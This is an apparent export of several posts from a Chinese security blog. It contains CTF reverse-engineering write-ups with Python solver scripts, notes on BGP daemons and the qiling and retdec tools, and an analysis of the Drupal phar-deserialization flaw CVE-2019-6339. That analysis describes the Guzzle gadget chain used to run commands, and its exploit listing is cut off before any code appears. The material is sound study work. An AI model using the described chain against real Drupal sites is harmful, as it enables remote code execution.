src="/2020/12/04/Karonte%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E7%AE%80%E8%A6%81/image-20201213182140683.png" alt="image-20201213182140683"></p><p>maybe, to be continued……</p><h3 id="7-测试结果分析"><a href="#7-测试结果分析" class="headerlink" title="7. 测试结果分析"></a>7. 测试结果分析</h3><p><img src="/2020/12/04/Karonte%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E7%AE%80%E8%A6%81/image-20201216134548209.png" alt="image-20201216134548209"></p>]]></content>
      
      
      <categories>
          
          <category> Read Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IoT </tag>
            
            <tag> Firmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>decryptme</title>
      <link href="2020/11/28/decryptme/"/>
      <url>2020/11/28/decryptme/</url>
      
        <content type="html"><![CDATA[<h3 id="1-encryption代码逻辑"><a href="#1-encryption代码逻辑" class="headerlink" title="1. encryption代码逻辑"></a>1. encryption代码逻辑</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> __int8 *out, <span class="keyword">char</span> *in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> xor_ch; <span class="comment">// ST09_1</span></span><br><span class="line">  <span class="keyword">char</span> and_ch; <span class="comment">// ST08_1</span></span><br><span class="line">  <span class="keyword">char</span> tmp_ch; <span class="comment">// ST08_1</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> index; <span class="comment">// [esp+Ah] [ebp-6h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 src_ch; <span class="comment">// [esp+Bh] [ebp-5h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    xor_ch = i ^ in[i];</span><br><span class="line">    and_ch = i &amp; in[i];</span><br><span class="line">    src_ch = in[i];</span><br><span class="line">    index = i;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      tmp_ch = <span class="number">2</span> * (index &amp; src_ch);</span><br><span class="line">      src_ch ^= index;</span><br><span class="line">      index = tmp_ch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( tmp_ch );</span><br><span class="line">    result = src_ch;</span><br><span class="line">    out[i] = src_ch;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将输入的字符串中的每个字符根据其下标i做相应的加密操作，如上面的伪代码中的do-while循环所示，先是做了一个<code>&amp;</code>操作，然后做了一个异或操作，每次循环判断<code>&amp;</code>操作的结果是否为0，为0则完成加密。单独看这段代码不知道他到底做了什么，室友发现了一个奇妙的地方，其实这就是将字符的ASCII码值减去下标的值（从0开始），得到的新ASCII值为加密后的字符。具体的逻辑是为什么不太清楚现在，看来得弄清楚&amp;和^到底具有什么实质性作用才会懂。</p><h3 id="2-解法"><a href="#2-解法" class="headerlink" title="2. 解法"></a>2. 解法</h3><p>根据上面得分析可以写个脚本来将加密后字符串解密回去。</p><p>也可以写个爆破脚本来把（0，0xFF）内的值都试一遍：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">flag,i</span>):</span></span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    and_ch = i &amp; flag</span><br><span class="line">    <span class="comment">#print(&quot;i:&quot;,hex(i),&quot;ch:&quot;,hex(input[i]))</span></span><br><span class="line">    src_ch = flag</span><br><span class="line">    index = i</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        tmp_ch = <span class="number">2</span> * (index &amp; src_ch)</span><br><span class="line">        src_ch = src_ch^index</span><br><span class="line">        <span class="comment">#print(&quot;src_ch:&quot;,hex(src_ch))</span></span><br><span class="line">        index = tmp_ch</span><br><span class="line">        <span class="keyword">if</span> tmp_ch == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    out = src_ch</span><br><span class="line">    <span class="comment">#print (&#x27;&#x27;.join(out))</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="comment"># def decrypt(ch,i):</span></span><br><span class="line"><span class="comment">#     out = 0</span></span><br><span class="line"><span class="comment">#     tmp_ch = 2 * (i &amp; ch)</span></span><br><span class="line"><span class="comment">#     src_ch = ch</span></span><br><span class="line"><span class="comment">#     index = i</span></span><br><span class="line"><span class="comment">#     while(1):</span></span><br><span class="line"><span class="comment">#         pass</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encrp = <span class="built_in">bytearray</span>(<span class="string">&#x27;34e8h9?&lt;&lt;mkCD&gt;F@DEDCzHxxKRQRNSRS&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment">#print(hex(encrp[5]))</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(index &lt; <span class="built_in">len</span>(encrp)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xFF</span>):</span><br><span class="line">        encrypted = encrypt(i,index)</span><br><span class="line">        <span class="comment">#print(&quot;ecrypt():&quot;,i,index)</span></span><br><span class="line">        <span class="keyword">if</span> encrypted == encrp[index]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(i)</span><br><span class="line">            print(flag)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> index == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;scuctf&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2020/11/28/decryptme/image-20201128022731544.png" alt="image-20201128022731544"></p>]]></content>
      
      
      <categories>
          
          <category> Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bgpd和bird程序分析</title>
      <link href="2020/11/22/bgpd%E5%92%8Cbird%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
      <url>2020/11/22/bgpd%E5%92%8Cbird%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="1-BGP协议规则提取"><a href="#1-BGP协议规则提取" class="headerlink" title="1. BGP协议规则提取"></a>1. BGP协议规则提取</h3><p>可以从RFC文档中提取，搜索关键词（MUST、MUST NOT、REQUIRED、SHALL、SHOULD、RECOMMAND、MAY、OPTIONAL）,查看关键的描述信息。</p><p><img src="/2020/11/22/bgpd%E5%92%8Cbird%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20201123011933414.png" alt="image-20201123011933414"></p><p>上面的例子就是对Path Atrribute中的Attribute Flags的设置规则的描述。</p><p>提取了相应的协议规则就需要到二进制程序中去寻找对应的部分，但这部分现阶段还是比较困难的，尤其是在二进制程序没有符号表的情况下。</p><h3 id="2-Bird程序："><a href="#2-Bird程序：" class="headerlink" title="2. Bird程序："></a>2. Bird程序：</h3><p>实际上协议规则的提取还是比较抽象的，到二进制程序中来分析又是另外一回事了，常见的是根据二进制程序中的字符串信息来定位规则实现的部分。</p><p>例如：</p><p>1）对IBGP和EBGP的判断，以及响应的ASN号的要求：</p><p><img src="/2020/11/22/bgpd%E5%92%8Cbird%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20201123012525214.png" alt="image-20201123012525214"></p><p>2）对AS number号的检查：</p><p><img src="/2020/11/22/bgpd%E5%92%8Cbird%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20201123013111395.png" alt="image-20201123013111395"></p><p>备注：一般字符串都是输出的调试信息，所以其调用的函数大致是一个printf类函数，可以将这个函数重命名，然后交叉引用查看整体程序的引用情况。</p><p><img src="/2020/11/22/bgpd%E5%92%8Cbird%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20201123013240120.png" alt="image-20201123013240120"></p><h3 id="3-Bgpd程序："><a href="#3-Bgpd程序：" class="headerlink" title="3. Bgpd程序："></a>3. Bgpd程序：</h3><p>Bgpd程序是Frrouting中实现BGP协议部分的程序，导入IDA后的Imports表中有很多Frr的外部函数，单独查看这个二进制文件是没法看到这些函数的具体实现的。</p><p>1）对Receive Length的检查：</p><p><img src="/2020/11/22/bgpd%E5%92%8Cbird%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20201123020352475.png" alt="image-20201123020352475"></p><p><img src="/2020/11/22/bgpd%E5%92%8Cbird%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20201123020444709.png" alt="image-20201123020444709"></p><p>2）对CapabilityCode的检查：</p><p><img src="/2020/11/22/bgpd%E5%92%8Cbird%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20201123021159932.png" alt="image-20201123021159932"></p><p>RFC 2842中对CapabilityCode的描述：</p><p><img src="/2020/11/22/bgpd%E5%92%8Cbird%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20201123021334758.png" alt="image-20201123021334758"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frrouting </tag>
            
            <tag> Bird </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11月月赛记录</title>
      <link href="2020/11/21/11%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%B0%E5%BD%95/"/>
      <url>2020/11/21/11%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="1-RE"><a href="#1-RE" class="headerlink" title="1. RE"></a>1. RE</h3><h4 id="1-1-卧龙和凤雏"><a href="#1-1-卧龙和凤雏" class="headerlink" title="1.1 卧龙和凤雏"></a>1.1 卧龙和凤雏</h4><p>给了一个2.rar，里面有一个需要解密的<code>enc</code>文件，一个<code>объект430</code>程序和一张图片。</p><p>分析<code>объект430</code>，逆向写出脚本获得解密需要的Key。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">data = [<span class="number">0x163F5</span>,<span class="number">0x6B2C0</span>,<span class="number">0x11A9F9</span>,<span class="number">0x157000</span>,<span class="number">0x1CB91</span>,<span class="number">0x1BB528</span>,<span class="number">0x1BB528</span>,<span class="number">0xDED21</span>,<span class="number">0x144F38</span>,<span class="number">0xFB89D</span>,<span class="number">0x169B48</span>,<span class="number">0xD151F</span>,<span class="number">0x8B98B</span>,<span class="number">0x17D140</span>,<span class="number">0xDED21</span>,<span class="number">0x1338C0</span>,</span><br><span class="line">    <span class="number">0x1338C0</span>,<span class="number">0x11A9F9</span>,<span class="number">0x1B000</span>,<span class="number">0x144F38</span>,<span class="number">0x13693</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    tmp = <span class="built_in">pow</span>(data[i],<span class="number">1</span>/<span class="number">3</span>)</span><br><span class="line">    print(tmp)</span><br><span class="line">    ch = <span class="built_in">int</span>(tmp) + <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(ch)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># -Lip1zzaner_Stalli0n+</span></span><br></pre></td></tr></table></figure><p>然后使用openssl解密：</p><p><code>openssl enc -d -aes256 -salt -in encry.rar.enc -out decry.rar -k -Lip1zzaner_Stalli0n+</code></p><p>打开解密后的压缩包，得到flag和下一道题的题目。</p><p><img src="/2020/11/21/11%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%B0%E5%BD%95/image-20201121112301402.png" alt="image-20201121112301402"></p><p>参考链接：</p><ul><li><a href="https://0xrick.github.io/hack-the-box/hawk/">https://0xrick.github.io/hack-the-box/hawk/</a></li><li><a href="https://github.com/glv2/bruteforce-salted-openssl">https://github.com/glv2/bruteforce-salted-openssl</a></li></ul><h4 id="1-2-卧龙和凤雏得其一者可安天下"><a href="#1-2-卧龙和凤雏得其一者可安天下" class="headerlink" title="1.2 卧龙和凤雏得其一者可安天下"></a>1.2 卧龙和凤雏得其一者可安天下</h4><p>一个简单的crackme，写个脚本就可以：</p><p>直接写逆算法比较麻烦，就直接在<code>0,0xff</code>中爆破去找吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">encrypted = <span class="built_in">bytearray</span>.fromhex(<span class="string">&#x27;CA7093C80654D2D5DA6AD159DE45F9B5A68719A5566E63&#x27;</span>)</span><br><span class="line">lst = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>):</span><br><span class="line">        n1 = (x ^ i) &lt;&lt; ((i ^ <span class="number">9</span>) &amp; <span class="number">3</span>)</span><br><span class="line">        n2 = (x ^ i) &gt;&gt; (<span class="number">8</span> - ((i ^ <span class="number">9</span>) &amp; <span class="number">3</span>))</span><br><span class="line">        <span class="keyword">if</span> (((n1 | n2) + <span class="number">8</span>)%<span class="number">256</span>)  == encrypted[i]:</span><br><span class="line">            lst.append(<span class="built_in">chr</span>(x))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(lst))</span><br></pre></td></tr></table></figure><p>参考链接：</p><ul><li><a href="https://github.com/andreafioraldi/angrgdb">https://github.com/andreafioraldi/angrgdb</a></li></ul><h4 id="1-3-re-Project1-exe"><a href="#1-3-re-Project1-exe" class="headerlink" title="1.3 re-Project1.exe"></a>1.3 re-Project1.exe</h4><p>base64魔改的一个算法，到这个网站去可以修改base64 table进行解码：魔改的表是<code>+\-0-9A-Za-z</code></p><ul><li><a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Space'/disabled)To_Base64('%2B%5C%5C-0-9A-Za-z'/disabled)From_Base64('%2B%5C%5C-0-9A-Za-z',true)To_Hex('Space',0/disabled)&input=RW9KMkFZNmtFSUoxQjJJbkYxTjJBMjZ0Rlky">CyberChef</a></li></ul><p><img src="/2020/11/21/11%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%B0%E5%BD%95/image-20201121154100603.png" alt="image-20201121154100603"></p><p>关键的几个点，程序将你输入的flag进行两次魔改的base64，但实际上比较的时候就只比较了第一次的结果。通过分析和OllyDbg调试，整理出下面的可能情况：</p><p>IDA中发现两个用于比较的编码后的字符串：<code>EoJ2AY6kEIJ1B2InF1N2A26tFY2</code>, <code>FawqPI3iAaosB3NYI473N+</code></p><p>分别解码后得到：</p><p><code>EoJ2AY6kEIJ1B2InF1N2A26tFY2</code>–&gt;<code>CED2B0AEC4E3D6D0B9FA</code>–&gt;<code>9.Ä4#.8d.&lt;.Â4´L</code></p><p><code>FawqPI3iAaosB3NYI473N+</code>–&gt;<code>Fo6mAn2m84VdPbEd</code>–&gt;<code>GB2312(hint)</code></p><p>由于比较的都是第一次编码后的结果，所以我们如果输入<code>CED2B0AEC4E3D6D0B9FA</code>和<code>Fo6mAn2m84VdPbEd</code>,就都会比较成功。根据给出的提示内容：</p><p><img src="/2020/11/21/11%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%B0%E5%BD%95/image-20201121155046612.png" alt="image-20201121155046612"></p><p>可以知道应该就是将<code>CED2B0AEC4E3D6D0B9FA</code>通过GB2312解码吧，但是好难找在线的解码工具，于是直接Google这串字符，原来就是“我爱你中国”啊！</p><p><img src="/2020/11/21/11%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%B0%E5%BD%95/image-20201121155332297.png" alt="image-20201121155332297"></p><p>其实Python可以解码的，只是自己太菜了。</p><p><img src="/2020/11/21/11%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%B0%E5%BD%95/image-20201121161053191.png" alt="image-20201121161053191"></p>]]></content>
      
      
      <categories>
          
          <category> Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 月赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qiling And retdec</title>
      <link href="2020/11/20/qiling-And-retdec/"/>
      <url>2020/11/20/qiling-And-retdec/</url>
      
        <content type="html"><![CDATA[<h3 id="1-qiling"><a href="#1-qiling" class="headerlink" title="1. qiling"></a>1. qiling</h3><p>一个强大的二进制分析框架，可以跨架构、跨平台，使用Python3实现。</p><ul><li>跨平台：Windows, MacOS, Linux, BSD, UEFI, DOS。</li><li>跨架构：X86, X86_64, Arm, Arm64, MIPS, 8086。</li><li>多文件格式支持：PE, MachO, ELF, COM。</li><li>在隔离的环境（sandbox）里模拟执行机器代码</li><li>支持跨架构跨平台的调试功能，主要是GDBserver远程调试。</li><li>提供了高层次的API来自定义沙箱代码，用于分析恶意程序。</li><li>允许在各个级别执行钩子（instruction/basic-block/memory-access/exception/syscall/IO/etc）.</li></ul><p>在Unicorn engine的基础上开发.</p><p>有意思的几个点：</p><ul><li>支持去控制流平展化：<a href="https://docs.qiling.io/en/latest/ida/#ollvm-de-flatten%EF%BC%8C%E4%BD%BF%E7%94%A8%E8%B5%B7%E6%9D%A5%E7%9C%8B%E4%B8%8A%E5%8E%BB%E5%BE%88%E7%AE%80%E5%8D%95%E3%80%82">https://docs.qiling.io/en/latest/ida/#ollvm-de-flatten，使用起来看上去很简单。</a></li><li>有一个IDAPro插件，通过自定义python脚本来调试程序，不需要远程调试。</li><li>支持各个平台的二进制文件，每个平台都需要设置一个配置文件，这里是以<code>.ql</code>为后缀来命名的。</li></ul><p>模拟执行的基本流程：</p><ul><li>初始化：<code>ql = QiLing()</code>，针对执行的二进制程序类型（Binary，Shellcode），有不同的参数。</li><li>配置：一些属性的设置（fs_mapper、debug_stop、debugger、multithread、ipv6、bindtolocalhost、root）</li><li>执行：<code>ql.run()</code></li></ul><p>需要注意的是，远程调试功能支持的是IDAPro7.4+，且调试时qiling需要在Linux上运行（由于unicorn的原因在Windows上不行），支持Python3.5+，我的配置还没这么好。</p><p>参考链接：</p><ul><li><a href="https://docs.qiling.io/en/latest/howto/">https://docs.qiling.io/en/latest/howto/</a></li><li><a href="https://docs.qiling.io/en/latest/ida/#ollvm-de-flatten">https://docs.qiling.io/en/latest/ida/#ollvm-de-flatten</a></li><li><a href="https://www.youtube.com/watch?v=xf0i9kfHKDI&amp;ab_channel=ZeroNights">https://www.youtube.com/watch?v=xf0i9kfHKDI&amp;ab_channel=ZeroNights</a></li><li><a href="https://kabeor.cn/%E4%BD%BF%E7%94%A8Qiling%20IDA%E6%8F%92%E4%BB%B6%E8%A7%A3%E5%AF%86Mirai%E7%97%85%E6%AF%92%E6%95%B0%E6%8D%AE/#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%8F%92%E4%BB%B6">https://kabeor.cn/%E4%BD%BF%E7%94%A8Qiling%20IDA%E6%8F%92%E4%BB%B6%E8%A7%A3%E5%AF%86Mirai%E7%97%85%E6%AF%92%E6%95%B0%E6%8D%AE/#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%8F%92%E4%BB%B6</a></li></ul><h3 id="2-retdec"><a href="#2-retdec" class="headerlink" title="2. retdec"></a>2. retdec</h3><p>这是一个基于LLVM的可重定向的机器码反编译器，不受平台结构、操作系统、二进制执行文件格式限制。</p><ul><li>支持的文件格式：ELF, PE, Mach-O, COFF, AR (archive), Intel HEX, and raw machine code</li><li>支持的架构：<ul><li>32位：ntel x86, ARM, MIPS, PIC32, and PowerPC</li><li>64位：x86-64, ARM64 (AArch64)</li></ul></li></ul><p>怎么使用：</p><ul><li><p>在线反编译服务：</p><ul><li><a href="https://retdec.com/decompilation/">https://retdec.com/decompilation/</a></li></ul></li><li><p><img src="/2020/11/20/qiling-And-retdec/image-20201122220439265.png" alt="image-20201122220439265"></p></li><li><p>RetDec IDA Plugin：</p><p><img src="/2020/11/20/qiling-And-retdec/image-20201122220556268.png" alt="image-20201122220556268"></p><p>例子：</p><p><img src="/2020/11/20/qiling-And-retdec/image-20201122220745260.png" alt="image-20201122220745260"></p><p>看上去RetDec反编译出来的源代码要更亲切得一点。</p></li></ul><p>参考链接：</p><ul><li><a href="https://www.youtube.com/watch?v=HHFvtt5b6yY&amp;ab_channel=botconfeu">https://www.youtube.com/watch?v=HHFvtt5b6yY&amp;ab_channel=botconfeu</a></li><li><a href="https://github.com/avast/retdec">https://github.com/avast/retdec</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 调研记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qiling </tag>
            
            <tag> retdec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-6339分析记录</title>
      <link href="2020/11/19/CVE-2019-6339%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"/>
      <url>2020/11/19/CVE-2019-6339%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="1-漏洞原理："><a href="#1-漏洞原理：" class="headerlink" title="1. 漏洞原理："></a>1. 漏洞原理：</h3><h4 id="1-1-描述"><a href="#1-1-描述" class="headerlink" title="1.1 描述"></a>1.1 描述</h4><p>在Drupal Core版本7.62之前的7.x、8.6.6之前的8.6.x和8.5.9之前的8.5.x； 在不受信任的<code>phar：// URI</code>上执行文件操作时，PHP的内置<code>phar流包装器</code>中存在一个远程执行代码漏洞。某些Drupal代码（核心代码，贡献代码和自定义代码）可能会在未经充分验证的用户输入上执行文件操作，从而容易受到此漏洞的影响。但是此类代码路径通常需要访问管理权限或非典型配置，所以这个漏洞的影响不是太大。</p><h4 id="1-2-Drupal"><a href="#1-2-Drupal" class="headerlink" title="1.2 Drupal"></a>1.2 Drupal</h4><p>Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/2683135">内容管理系统</a>（CMS）和PHP开发框架（Framework）共同构成。</p><h4 id="1-3-phar反序列化"><a href="#1-3-phar反序列化" class="headerlink" title="1.3 phar反序列化"></a>1.3 phar反序列化</h4><p>phar提供了一种将整个PHP应用程序放入称为“ phar”（PHP存档）的单个文件中的方法，以便于分发和安装。</p><p>Phar文件结构主要包含三至四个部分：</p><ul><li><p>A stub：可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><p><img src="/2020/11/19/CVE-2019-6339%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20201120190344828.png" alt="image-20201120190344828"></p></li><li><p>a <strong>manifest</strong> describing the contents：phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是phar反序列化的攻击手法最核心的地方。</p><p><img src="/2020/11/19/CVE-2019-6339%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/24388aaa-6ea4-4856-8fb1-fbf29deb5dca.png-w331s" alt="img"></p></li><li><p>the file <strong>contents</strong></p><p>被压缩文件的内容。</p></li><li><p>a <strong>signature</strong> for verifying Phar integrity </p><p><img src="/2020/11/19/CVE-2019-6339%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20201120190436599.png" alt="image-20201120190436599"></p></li></ul><h4 id="1-4-漏洞触发流程"><a href="#1-4-漏洞触发流程" class="headerlink" title="1.4 漏洞触发流程"></a>1.4 漏洞触发流程</h4><p>在Drupal的文件管理系统模块中，对文件目录的检查使用的时<code>is_dir</code>函数，这是一个直接的文件操作函数，而在2018年的blackhat上有研究人员提出，如果对phar文件进行文件操作，则其中的meta-data数据则会反序列化执行。</p><p><img src="/2020/11/19/CVE-2019-6339%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20201122010122253.png" alt="image-20201122010122253"></p><p>而这个漏洞是在管理员登录的情况下上传一个经过phar化的图片文件作为头像，图片文件中包含恶意构造的Payload用来执行命令，然后在文件系统的配置页面下，修改临时目录的值指向这个图片文件（利用phar流访问的方式），服务端会对这个文件进行check看是不是一个目录：</p><p><img src="/2020/11/19/CVE-2019-6339%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20201122010734070.png" alt="image-20201122010734070"></p><p>同时就会对meta-data数据进行反序列化执行。</p><h4 id="1-4-Payload数据构造"><a href="#1-4-Payload数据构造" class="headerlink" title="1.4 Payload数据构造"></a>1.4 Payload数据构造</h4><p>PoC中使用的是Drupal的两个关键类<code>GuzzleHttp\HandlerStack</code>,<code>GuzzleHttp\Psr7\FnStream</code>来进行构造的，阅读源码可以发现FnStream主要是实现一个自定义的方法，可以看到它的构造函数和析构函数是这样的：</p><p><img src="/2020/11/19/CVE-2019-6339%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20201122012712670.png" alt="image-20201122012712670"></p><p>会将传入的参数作为函数名创建，而每个函数名都是调用<code>call_user_func</code>实现的，析构函数中判断是否存在<code>_fn_close</code>方法，存在则调用。</p><p>而HandlerStack类则是通过将中间件堆叠在HTTP处理程序函数之上，创建组合的Guzzle处理程序函数，其成员<code>private $handler</code>就是一个回调函数对象，可以进行已有函数的自定义来执行命令。</p><p>整理一下，调用栈大致如下：</p><p><img src="/2020/11/19/CVE-2019-6339%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20201122020030655.png" alt="image-20201122020030655"></p><ul><li>FnStream的析构函数通过<code>call_user_func(Array)</code>执行我们自定义的<code>close</code>方法（里面实际是一个数组，由HandlerStack对象和”resolve”组成）</li><li>然后就会去执行HandlerStack的resolve函数，而我们可以自定义HandlerStack的成员使它来执行系统命令</li><li>最后经过resolve解析后就会真正执行我们构造的函数(1.5的EXP中是<code>passthru(&quot;uname -a&quot;)</code>)了。</li></ul><h4 id="1-5-可执行任意的命令的Exp"><a href="#1-5-可执行任意的命令的Exp" class="headerlink" title="1.5 可执行任意的命令的Exp"></a>1.5 可执行任意的命令的Exp</h4><p>用PHP写的，php语法不是太熟，还请见谅：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 